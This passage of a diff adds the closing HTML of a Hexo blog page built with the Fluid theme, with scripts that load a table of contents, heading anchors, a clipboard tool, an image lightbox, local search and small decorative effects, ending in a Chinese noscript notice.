+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/diy/qipao.js"></script>
+<script src="/js/diy/timeDate.js"></script>
+<script src="/js/diy/shubiaozi.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
